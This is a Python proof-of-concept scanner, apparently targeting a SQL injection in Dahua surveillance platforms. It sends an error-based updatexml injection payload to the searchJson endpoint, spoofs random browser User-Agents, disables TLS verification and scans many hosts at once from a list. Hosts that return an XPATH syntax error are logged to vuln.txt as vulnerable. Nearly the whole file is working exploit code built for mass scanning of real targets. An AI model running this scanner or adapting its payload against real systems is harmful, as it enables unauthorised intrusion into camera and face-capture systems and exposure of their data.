import requests
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url_list = []

def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua

def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")

def check_url(url):
    url = parse.urlparse(url)
    url = '{}://{}'.format(url[0], url[1])
    vulnurl = url + "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20@@version),0x7e),1)--%22%7D/extend/%7B%7D"
    headers = {
        'User-Agent': get_ua(),
    }

    try:
        res = requests.get(vulnurl, verify=False, allow_redirects=False, headers=headers, timeout=80)
        if res.status_code == 500 and "SQL" in res.text and "XPATH syntax error" in res.text:
            print("\033[32m[+]{} is vulnerable.\033[0m".format(url))
            wirte_targets(url, "vuln.txt")
        else:
            print("\033[34m[-]{} is not vulnerable.\033[0m".format(url))
    except Exception as e:
        print("\033[31m[!]{} is timeout.\033[0m".format(url))
        pass


def multithreading(url_list, pools=5):
    works = []
    for i in url_list:
        # works.append((func_params, None))
        works.append(i)
    # print(works)
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(check_url, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


if __name__ == '__main__':
    show = r'''
    
  _____        _    _             
 |  __ \      | |  | |            
 | |  | | __ _| |__| |_   _  __ _ 
 | |  | |/ _` |  __  | | | |/ _` |
 | |__| | (_| | |  | | |_| | (_| |
 |_____/ \__,_|_|  |_|\__,_|\__,_|
                                  
                            tag:Dahua SqlInjection poc                                       
                            @version: 1.0.0   @author: csd
	'''
    print(show + '\n')
    arg = ArgumentParser(description='DaHua check_vulnerabilities by csd')
    arg.add_argument("-u",
                     "--url",
                     help="Target URL; Example:python3 searchJson_sqlscan.py -u http://www.example.com")
    arg.add_argument("-f",
                     "--file",
                     help="Target URL; Example:python3 searchJson_sqlscan.py -f url.txt")
    args = arg.parse_args()
    url = args.url
    filename = args.file
    print("[+]任务开始.....")
    start = time()
    if url != None and filename == None:
        check_url(url)
    elif url == None and filename != None:
        for i in open(filename):
            i = i.replace('\n', '')
            url_list.append(i)
        multithreading(url_list, 10)
    end = time()
    print('任务完成,用时{}s.'.format(end - start))